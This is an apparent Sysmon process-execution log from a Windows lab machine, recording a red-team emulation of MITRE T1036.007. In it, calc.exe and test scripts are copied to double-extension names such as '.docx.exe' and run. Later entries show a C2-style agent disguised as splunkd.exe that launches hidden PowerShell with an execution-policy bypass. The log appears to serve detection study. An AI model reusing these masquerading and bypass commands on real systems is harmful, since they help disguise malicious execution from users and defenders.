"2025-12-23 14:12:37.758 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172674,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-9545-694A-C502-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.756","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:38.833 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172676,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 9036 ¦ PGUID: E9F06A57-9546-694A-C702-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:38.821","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:40.164 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172678,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8988 ¦ PGUID: E9F06A57-9548-694A-CA02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:40.117","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.969 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172683,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.966","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.205 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172685,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.204","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.421 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172687,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.420","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.924 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172691,"Cmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300 ¦ ParentPID: 4192 ¦ ParentPGUID: E9F06A57-9570-694A-D202-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 